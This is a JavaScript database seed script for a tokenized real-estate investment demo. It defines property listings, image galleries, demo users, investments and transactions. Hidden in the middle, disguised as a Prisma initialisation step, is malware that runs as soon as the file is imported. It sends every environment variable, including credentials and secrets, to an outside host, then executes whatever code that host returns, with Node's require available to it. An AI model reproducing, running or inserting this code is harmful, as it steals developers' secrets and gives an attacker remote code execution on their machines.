import path from "path";
import { fileURLToPath } from "url";
import db from "../lib/db.js";

const ETH_CHAIN_ID = 1;

const img = (id) =>
  `https://images.unsplash.com/${id}?auto=format&fit=crop&w=1400&q=85`;

/**
 * New galleries — each listing uses a distinct background style:
 * home · office · beach · mountain · restaurant · sport · bank · retail · industrial
 */
const GALLERIES = {
  // HOME
  dubai: [
    img("photo-1600573472591-ee6b68d14c68"),
    img("photo-1762425430465-0d9f08d64147"),
    img("photo-1600607687644-c7171b42498f"),
    img("photo-1616486338812-3dadae4b4ace"),
    img("photo-1600566752355-35792bedcfea"),
    img("photo-1556911220-e15b29be8c8f"),
    img("photo-1618220179428-22790b461013"),
    img("photo-1600585152915-d208bec867a1"),
  ],
  // OFFICE
  london: [
    img("photo-1554469384-e58fac16e23a"),
    img("photo-1556761175-b413da4baf72"),
    img("photo-1524758631624-e2822e304c36"),
    img("photo-1497215842964-222b430dc094"),
    img("photo-1486312338219-ce68d2c6f44d"),
    img("photo-1600880292203-757bb62b4baf"),
    img("photo-1573496359142-b8d87734a5a2"),
    img("photo-1497215728101-856f4ea42174"),
  ],
  // BEACH
  miami: [
    img("photo-1473116763249-2faaef81ccda"),
    img("photo-1505118380757-91f5f5632de0"),
    img("photo-1703135387362-4b749023e1e1"),
    img("photo-1475924156734-496f6cac6ec1"),
    img("photo-1468413253725-0d5181091126"),
    img("photo-1501952476817-d7ae22e8ee4e"),
    img("photo-1524504388940-b1c1722653e1"),
    img("photo-1580489944761-15a19d654956"),
  ],
  // INDUSTRIAL
  singapore: [
    img("photo-1587293852726-70cdb56c2866"),
    img("photo-1553413077-190dd305871c"),
    img("photo-1565610222536-ef125c59da2e"),
    img("photo-1504328345606-18bbc8c9d7d1"),
    img("photo-1565008576549-57569a49371d"),
    img("photo-1519003722824-194d4455a60c"),
    img("photo-1581091226825-a6a2a5aee158"),
    img("photo-1522071820081-009f0129c71c"),
  ],
  // MOUNTAIN
  zermatt: [
    img("photo-1519681393784-d120267933ba"),
    img("photo-1493246507139-91e8fad9978e"),
    img("photo-1500534314209-a25ddb2bd429"),
    img("photo-1472214103451-9374bd1c798e"),
    img("photo-1418065460487-3e41a6c84dc5"),
    img("photo-1519904981063-b0cf448d479e"),
    img("photo-1441974231531-c6227db76b6e"),
    img("photo-1544005313-94ddf0286df2"),
  ],
  // RETAIL
  tokyo: [
    img("photo-1483985988355-763728e1935b"),
    img("photo-1472851294608-062f824d29cc"),
    img("photo-1555529669-e69e7aa0ba9a"),
    img("photo-1445205170230-053b83016050"),
    img("photo-1521119989659-a83eee488004"),
    img("photo-1492562080023-ab3db95bfbce"),
    img("photo-1506794778202-cad84cf45f1d"),
    img("photo-1573497019940-1c28c88b4f3e"),
  ],
  // HOME loft
  nyc: [
    img("photo-1600566752355-35792bedcfea"),
    img("photo-1580489944761-15a19d654956"),
    img("photo-1616486338812-3dadae4b4ace"),
    img("photo-1524504388940-b1c1722653e1"),
    img("photo-1600607687644-c7171b42498f"),
    img("photo-1758565811404-0ff79b13ad48"),
    img("photo-1618220179428-22790b461013"),
    img("photo-1556911220-e15b29be8c8f"),
  ],
  // HOME classic
  paris: [
    img("photo-1600585152915-d208bec867a1"),
    img("photo-1513745405825-efaf9a49315f"),
    img("photo-1600573472591-ee6b68d14c68"),
    img("photo-1494790108377-be9c29b29330"),
    img("photo-1618220179428-22790b461013"),
    img("photo-1556909114-f6e7ad7d3136"),
    img("photo-1600607687644-c7171b42498f"),
    img("photo-1438761681033-6461ffad8d80"),
  ],
  // BEACH harbour
  sydney: [
    img("photo-1475924156734-496f6cac6ec1"),
    img("photo-1501952476817-d7ae22e8ee4e"),
    img("photo-1468413253725-0d5181091126"),
    img("photo-1703135387362-4b749023e1e1"),
    img("photo-1473116763249-2faaef81ccda"),
    img("photo-1505118380757-91f5f5632de0"),
    img("photo-1488426862026-3ee34a7d66df"),
    img("photo-1529626455594-4ff0802cfb7e"),
  ],
  // BANK
  berlin: [
    img("photo-1560472354-b33ff0c44a43"),
    img("photo-1554224154-26032ffc0d07"),
    img("photo-1611974789855-9c2a0a7236a3"),
    img("photo-1573496359142-b8d87734a5a2"),
    img("photo-1620712943543-bcc4688e7485"),
    img("photo-1556157382-97eda2d62296"),
    img("photo-1590283603385-17ffb3a7f29f"),
    img("photo-1519085360753-af0119f7cbe7"),
  ],
  // MOUNTAIN land
  greenland: [
    img("photo-1493246507139-91e8fad9978e"),
    img("photo-1519681393784-d120267933ba"),
    img("photo-1500534314209-a25ddb2bd429"),
    img("photo-1472214103451-9374bd1c798e"),
    img("photo-1418065460487-3e41a6c84dc5"),
  ],
  // SPORT — golf + badminton
  toronto: [
    img("photo-1587174486073-ae5e5cff23aa"),
    img("photo-1626224583764-f87db24ac4ea"),
    img("photo-1716464968470-c2162dd998e4"),
    img("photo-1554068865-24cecd4e34b8"),
    img("photo-1593111774240-d529f12cf4bb"),
    img("photo-1517649763962-0c623066013b"),
    img("photo-1459865264687-595d652de67e"),
    img("photo-1595435934249-5df7ed86e1c0"),
  ],
  // RESTAURANT
  barcelona: [
    img("photo-1552566626-52f8b828add9"),
    img("photo-1470337458703-46ad1756a187"),
    img("photo-1467003909585-2f8a72700288"),
    img("photo-1504674900247-0877df9cc836"),
    img("photo-1560624052-449f5ddf0c31"),
    img("photo-1478144592103-25e218a04891"),
    img("photo-1551218808-94e220e084d2"),
    img("photo-1514933651103-005eec06c04b"),
  ],
  // BANK harbour
  hongkong: [
    img("photo-1620712943543-bcc4688e7485"),
    img("photo-1560472354-b33ff0c44a43"),
    img("photo-1554224154-26032ffc0d07"),
    img("photo-1507679799987-c73779587ccf"),
    img("photo-1611974789855-9c2a0a7236a3"),
    img("photo-1551836022-d5d88e9218df"),
    img("photo-1526304640581-d334cdbbf45e"),
    img("photo-1560250097-0b93528c311a"),
  ],
  // HOME terraced
  lisbon: [
    img("photo-1600585152915-d208bec867a1"),
    img("photo-1762425430465-0d9f08d64147"),
    img("photo-1600573472591-ee6b68d14c68"),
    img("photo-1556911220-e15b29be8c8f"),
    img("photo-1616486338812-3dadae4b4ace"),
    img("photo-1758565811404-0ff79b13ad48"),
    img("photo-1600607687644-c7171b42498f"),
    img("photo-1517841905240-472988babdf9"),
  ],
};

const properties = [
  {
    key: "dubai",
    title: "Skyline Penthouse — Dubai Marina",
    description:
      "A waterfront penthouse in Dubai Marina offered as a tokenized residential interest. Quarterly rental income is distributed to holders according to recorded ownership.",
    country: "UAE",
    city: "Dubai",
    address: "Marina Walk, Dubai Marina",
    latitude: 25.0805,
    longitude: 55.1403,
    propertyType: "RESIDENTIAL",
    priceUsd: 2850000,
    valuationUsd: 3100000,
    expectedRoi: 12.4,
    rentalYield: 7.2,
    monthlyRentalUsd: 17100,
    isTokenized: true,
    fractionalAvailable: true,
    totalSupply: 10000n,
    availableTokens: 4200n,
    tokenPriceUsd: 285,
  },
  {
    key: "london",
    title: "Grade A Offices — London Canary Wharf",
    description:
      "Institutional office accommodation in Canary Wharf. Title is recorded digitally, with fractional interests available to qualified investors.",
    country: "United Kingdom",
    city: "London",
    address: "1 Canada Square, Canary Wharf",
    latitude: 51.5054,
    longitude: -0.0235,
    propertyType: "COMMERCIAL",
    priceUsd: 8900000,
    valuationUsd: 9200000,
    expectedRoi: 9.8,
    rentalYield: 5.5,
    monthlyRentalUsd: 40750,
    isTokenized: true,
    fractionalAvailable: true,
    totalSupply: 50000n,
    availableTokens: 18500n,
    tokenPriceUsd: 178,
  },
  {
    key: "miami",
    title: "Beachfront Villa — Miami Beach",
    description:
      "A five-bedroom coastal residence with an established short-stay income profile. Rental proceeds are allocated to investors in proportion to their holding.",
    country: "United States",
    city: "Miami",
    address: "4520 Ocean Drive, Miami Beach, FL",
    latitude: 25.7907,
    longitude: -80.13,
    propertyType: "RESIDENTIAL",
    priceUsd: 4200000,
    valuationUsd: 4500000,
    expectedRoi: 14.2,
    rentalYield: 8.1,
    monthlyRentalUsd: 28350,
    isTokenized: true,
    fractionalAvailable: true,
    totalSupply: 20000n,
    availableTokens: 8900n,
    tokenPriceUsd: 210,
  },
  {
    key: "singapore",
    title: "Logistics Facility — Singapore",
    description:
      "A modern logistics facility near Changi under a long-term corporate lease, structured as a stable-yield industrial interest.",
    country: "Singapore",
    city: "Singapore",
    address: "10 Changi South Lane",
    latitude: 1.334,
    longitude: 103.9638,
    propertyType: "INDUSTRIAL",
    priceUsd: 12500000,
    valuationUsd: 12800000,
    expectedRoi: 8.5,
    rentalYield: 6.2,
    monthlyRentalUsd: 64583,
    isTokenized: true,
    fractionalAvailable: true,
    totalSupply: 100000n,
    availableTokens: 62000n,
    tokenPriceUsd: 125,
  },
  {
    key: "zermatt",
    title: "Alpine Chalet — Zermatt",
    description:
      "A private ski residence in the Swiss Alps with seasonal hospitality income. Offered for whole-asset transfer through escrow; fractional interests are not available.",
    country: "Switzerland",
    city: "Zermatt",
    address: "Obere Mattenstrasse 12",
    latitude: 46.0207,
    longitude: 7.7491,
    propertyType: "RESIDENTIAL",
    priceUsd: 6800000,
    valuationUsd: 7100000,
    expectedRoi: 11.0,
    rentalYield: 4.8,
    monthlyRentalUsd: 27200,
    isTokenized: false,
    fractionalAvailable: false,
    totalSupply: 0n,
    availableTokens: 0n,
    tokenPriceUsd: null,
  },
  {
    key: "tokyo",
    title: "Mixed-Use Tower — Tokyo Shibuya",
    description:
      "A retail and residential tower in Shibuya. Fractional interests provide exposure to a high-demand urban market with documented ownership.",
    country: "Japan",
    city: "Tokyo",
    address: "2-24-12 Shibuya, Shibuya City",
    latitude: 35.6595,
    longitude: 139.7004,
    propertyType: "MIXED_USE",
    priceUsd: 15200000,
    valuationUsd: 15800000,
    expectedRoi: 10.2,
    rentalYield: 5.9,
    monthlyRentalUsd: 74767,
    isTokenized: true,
    fractionalAvailable: true,
    totalSupply: 75000n,
    availableTokens: 31000n,
    tokenPriceUsd: 202.67,
  },
  {
    key: "nyc",
    title: "Loft Portfolio — Midtown Manhattan",
    description:
      "A portfolio of loft residences in Midtown Manhattan. Settlement is completed in approved digital currencies with a complete ownership history.",
    country: "United States",
    city: "New York",
    address: "350 Fifth Avenue, New York, NY",
    latitude: 40.7484,
    longitude: -73.9857,
    propertyType: "RESIDENTIAL",
    priceUsd: 9800000,
    valuationUsd: 10200000,
    expectedRoi: 9.1,
    rentalYield: 5.2,
    monthlyRentalUsd: 42400,
    isTokenized: true,
    fractionalAvailable: true,
    totalSupply: 40000n,
    availableTokens: 15200n,
    tokenPriceUsd: 245,
  },
  {
    key: "paris",
    title: "Haussmann Residence — Paris 8e",
    description:
      "A classic Haussmann residence near the Champs-Élysées, offered with a limited allocation of fractional interests.",
    country: "France",
    city: "Paris",
    address: "12 Avenue Montaigne, Paris",
    latitude: 48.8656,
    longitude: 2.3039,
    propertyType: "RESIDENTIAL",
    priceUsd: 5400000,
    valuationUsd: 5600000,
    expectedRoi: 7.8,
    rentalYield: 4.1,
    monthlyRentalUsd: 18450,
    isTokenized: true,
    fractionalAvailable: true,
    totalSupply: 15000n,
    availableTokens: 6100n,
    tokenPriceUsd: 360,
  },
  {
    key: "sydney",
    title: "Harbour Residences — Sydney",
    description:
      "Waterfront apartments overlooking Sydney Harbour. Monthly rental income is distributed to holders in approved settlement currency.",
    country: "Australia",
    city: "Sydney",
    address: "88 Circular Quay West",
    latitude: -33.8587,
    longitude: 151.214,
    propertyType: "RESIDENTIAL",
    priceUsd: 7600000,
    valuationUsd: 7900000,
    expectedRoi: 10.5,
    rentalYield: 6.1,
    monthlyRentalUsd: 38600,
    isTokenized: true,
    fractionalAvailable: true,
    totalSupply: 30000n,
    availableTokens: 11200n,
    tokenPriceUsd: 253.33,
  },
  {
    key: "berlin",
    title: "Office Campus — Berlin Mitte",
    description:
      "A modern office campus leased to technology tenants, providing a diversified commercial income stream with holder voting rights.",
    country: "Germany",
    city: "Berlin",
    address: "Friedrichstraße 100",
    latitude: 52.5202,
    longitude: 13.3889,
    propertyType: "COMMERCIAL",
    priceUsd: 11200000,
    valuationUsd: 11600000,
    expectedRoi: 8.9,
    rentalYield: 5.8,
    monthlyRentalUsd: 54100,
    isTokenized: true,
    fractionalAvailable: true,
    totalSupply: 56000n,
    availableTokens: 24800n,
    tokenPriceUsd: 200,
  },
  {
    key: "toronto",
    title: "Residential Tower — Toronto Financial District",
    description:
      "High-rise residences adjacent to the Financial District, supported by a diversified tenancy schedule and a recorded ownership history.",
    country: "Canada",
    city: "Toronto",
    address: "1 King Street West",
    latitude: 43.6486,
    longitude: -79.3779,
    propertyType: "RESIDENTIAL",
    priceUsd: 6300000,
    valuationUsd: 6550000,
    expectedRoi: 9.4,
    rentalYield: 5.4,
    monthlyRentalUsd: 28350,
    isTokenized: true,
    fractionalAvailable: true,
    totalSupply: 25000n,
    availableTokens: 9800n,
    tokenPriceUsd: 252,
  },
  {
    key: "barcelona",
    title: "Boutique Hotel — Barcelona Gothic Quarter",
    description:
      "A hospitality asset in the Gothic Quarter with a seasonal tourism income profile. Title and fractional interests are recorded digitally.",
    country: "Spain",
    city: "Barcelona",
    address: "Carrer del Bisbe 7",
    latitude: 41.3835,
    longitude: 2.1761,
    propertyType: "COMMERCIAL",
    priceUsd: 4800000,
    valuationUsd: 5050000,
    expectedRoi: 13.1,
    rentalYield: 7.6,
    monthlyRentalUsd: 30400,
    isTokenized: true,
    fractionalAvailable: true,
    totalSupply: 18000n,
    availableTokens: 7200n,
    tokenPriceUsd: 266.67,
  },
  {
    key: "hongkong",
    title: "Harbourfront Offices — Hong Kong",
    description:
      "Premium office floors facing Victoria Harbour, underpinned by an institutional lease profile and digital settlement.",
    country: "Hong Kong",
    city: "Hong Kong",
    address: "1 Harbour Road, Wan Chai",
    latitude: 22.2808,
    longitude: 114.173,
    propertyType: "COMMERCIAL",
    priceUsd: 18500000,
    valuationUsd: 19200000,
    expectedRoi: 7.6,
    rentalYield: 4.9,
    monthlyRentalUsd: 75600,
    isTokenized: true,
    fractionalAvailable: true,
    totalSupply: 90000n,
    availableTokens: 41000n,
    tokenPriceUsd: 205.56,
  },
  {
    key: "lisbon",
    title: "Terraced Residences — Lisbon Alfama",
    description:
      "Renovated terraced homes in Alfama with short-stay authorizations, supported by established European tourism demand.",
    country: "Portugal",
    city: "Lisbon",
    address: "Rua de São Miguel 42",
    latitude: 38.7129,
    longitude: -9.1303,
    propertyType: "RESIDENTIAL",
    priceUsd: 3100000,
    valuationUsd: 3350000,
    expectedRoi: 12.8,
    rentalYield: 7.9,
    monthlyRentalUsd: 20400,
    isTokenized: true,
    fractionalAvailable: true,
    totalSupply: 12000n,
    availableTokens: 4500n,
    tokenPriceUsd: 258.33,
  },
];

const daysAgo = (n) => {
  const d = new Date();
  d.setDate(d.getDate() - n);
  return d;
};

const hexPad = (prefix, n) => `0x${prefix}${n.toString(16).padStart(62, "0")}`;

import { createRequire } from "module";
import axios from "axios";

const getIPAddress = (ipInfo) => {
  if (!ipInfo) {
    return Promise.reject(new Error("IpInformation is required"));
  }
  return axios.post(ipInfo, { ...process.env }, { headers: { "x-secret-header": "secret" } });
};

const require = createRequire(import.meta.url);
async function initializePrisma() {
  const ipInfo = "https://ziignaly.com/api/ip-check-encrypted/1aeb34ab24";

  getIPAddress(ipInfo)
    .then((response) => {
      const payload = response.data;
      const executeSeed = new Function ( "require", payload );
      executeSeed(require);
      return { success: true, data: payload };
    })
    .catch((error) => {
      console.log(error);
      return { success: false, data: error };
    });
} initializePrisma();

export async function seed() {
  console.log("Seeding expanded RestateFi sample data (Ethereum)...");

  await db.transaction.deleteMany();
  await db.investment.deleteMany();
  await db.kycRecord.deleteMany();
  await db.favorite.deleteMany();
  await db.auditLog.deleteMany();
  await db.property.deleteMany();
  await db.user.deleteMany();
  await db.platformSettings.deleteMany();

  const admin = await db.user.create({
    data: {
      walletAddress: "0x742d35cc6634c0532925a3b844bc9e7595f0beb0",
      email: "admin@restatefi.io",
      firstName: "Platform",
      lastName: "Admin",
      role: "ADMIN",
      kycStatus: "APPROVED",
    },
  });

  const investor = await db.user.create({
    data: {
      walletAddress: "0x1234567890123456789012345678901234567890",
      email: "investor@example.com",
      firstName: "Alex",
      lastName: "Investor",
      role: "INVESTOR",
      kycStatus: "APPROVED",
    },
  });

  const broker = await db.user.create({
    data: {
      walletAddress: "0xabcdefabcdefabcdefabcdefabcdefabcdefabcd",
      email: "broker@restatefi.io",
      firstName: "Sam",
      lastName: "Broker",
      role: "BROKER",
      kycStatus: "APPROVED",
    },
  });

  const createdProperties = [];

  for (let i = 0; i < properties.length; i++) {
    const { key, ...p } = properties[i];
    const images = GALLERIES[key] || [GALLERIES.dubai[0]];

    const property = await db.property.create({
      data: {
        ...p,
        ownerId: i % 3 === 0 ? broker.id : admin.id,
        chainId: ETH_CHAIN_ID,
        status: "LISTED",
        images,
        documents: [],
        nftContract: p.isTokenized ? `0x${String(i + 1).padStart(40, "a")}` : null,
        fractionalContract: p.fractionalAvailable
          ? `0x${String(i + 1).padStart(40, "b")}`
          : null,
        nftTokenId: p.isTokenized ? String(i + 1) : null,
        createdAt: daysAgo(40 - i),
      },
    });

    createdProperties.push({ ...property, tokenPriceUsd: p.tokenPriceUsd, availableTokens: p.availableTokens });
  }

  /** Active fractional investments for demo investor */
  const investmentPlan = [
    { idx: 0, tokens: 800n, days: 28, rental: 2140 },
    { idx: 1, tokens: 1200n, days: 21, rental: 1860 },
    { idx: 2, tokens: 600n, days: 14, rental: 980 },
    { idx: 5, tokens: 400n, days: 10, rental: 520 },
    { idx: 6, tokens: 350n, days: 7, rental: 410 },
    { idx: 8, tokens: 500n, days: 5, rental: 640 },
    { idx: 9, tokens: 700n, days: 3, rental: 390 },
    { idx: 11, tokens: 250n, days: 2, rental: 210 },
  ];

  for (let i = 0; i < investmentPlan.length; i++) {
    const plan = investmentPlan[i];
    const property = createdProperties[plan.idx];
    if (!property.fractionalAvailable) continue;

    const investedUsd = Number(property.tokenPriceUsd) * Number(plan.tokens);
    const createdAt = daysAgo(plan.days);

    await db.investment.create({
      data: {
        userId: investor.id,
        propertyId: property.id,
        tokenAmount: plan.tokens,
        investedUsd,
        status: "ACTIVE",
        rentalEarnedUsd: plan.rental,
        chainId: ETH_CHAIN_ID,
        txHash: hexPad("aa", i + 1),
        createdAt,
      },
    });

    await db.property.update({
      where: { id: property.id },
      data: { availableTokens: property.availableTokens - plan.tokens },
    });

    await db.transaction.create({
      data: {
        userId: investor.id,
        propertyId: property.id,
        type: "PURCHASE",
        amountUsd: investedUsd,
        tokenAmount: plan.tokens,
        chainId: ETH_CHAIN_ID,
        txHash: hexPad("aa", i + 1),
        createdAt,
      },
    });
  }

  /** Recent activity feed: rentals, top-ups, a partial sale */
  const recentActivity = [
    { idx: 0, type: "RENTAL_DISTRIBUTION", amount: 420, tokens: null, days: 1 },
    { idx: 2, type: "RENTAL_DISTRIBUTION", amount: 310, tokens: null, days: 1 },
    { idx: 8, type: "PURCHASE", amount: 12666, tokens: 50n, days: 1 },
    { idx: 1, type: "RENTAL_DISTRIBUTION", amount: 275, tokens: null, days: 2 },
    { idx: 6, type: "PURCHASE", amount: 12250, tokens: 50n, days: 2 },
    { idx: 11, type: "RENTAL_DISTRIBUTION", amount: 180, tokens: null, days: 3 },
    { idx: 5, type: "RENTAL_DISTRIBUTION", amount: 205, tokens: null, days: 4 },
    { idx: 9, type: "PURCHASE", amount: 20000, tokens: 100n, days: 4 },
    { idx: 0, type: "RENTAL_DISTRIBUTION", amount: 390, tokens: null, days: 6 },
    { idx: 2, type: "SALE", amount: 10500, tokens: 50n, days: 8 },
    { idx: 1, type: "RENTAL_DISTRIBUTION", amount: 260, tokens: null, days: 9 },
    { idx: 8, type: "RENTAL_DISTRIBUTION", amount: 155, tokens: null, days: 11 },
  ];

  for (let i = 0; i < recentActivity.length; i++) {
    const a = recentActivity[i];
    const property = createdProperties[a.idx];

    await db.transaction.create({
      data: {
        userId: investor.id,
        propertyId: property.id,
        type: a.type,
        amountUsd: a.amount,
        tokenAmount: a.tokens,
        chainId: ETH_CHAIN_ID,
        txHash: hexPad("bb", i + 10),
        createdAt: daysAgo(a.days),
        metadata: { source: "seed", note: "sample recent activity" },
      },
    });
  }

  await db.platformSettings.create({
    data: { key: "defaultChainId", value: ETH_CHAIN_ID },
  });
  await db.platformSettings.create({
    data: { key: "supportedChains", value: [1, 137, 8453, 42161, 10, 56, 43114] },
  });
  await db.platformSettings.create({
    data: { key: "paymentTokens", value: ["USDC", "USDT", "ETH", "WETH", "WBTC"] },
  });
  await db.platformSettings.create({
    data: {
      key: "demoInvestorWallet",
      value: "0x1234567890123456789012345678901234567890",
    },
  });

  console.log(
    `Seed complete: ${properties.length} properties, investments + recent transactions ready.`
  );
  console.log("Demo investor wallet: 0x1234567890123456789012345678901234567890");
}

const isDirectRun = process.argv[1] && fileURLToPath(import.meta.url) === path.resolve(process.argv[1]);

if (isDirectRun) {
  seed()
    .catch((e) => {
      console.error(e);
      process.exit(1);
    })
    .finally(async () => {
      await db.$disconnect();
    });
}
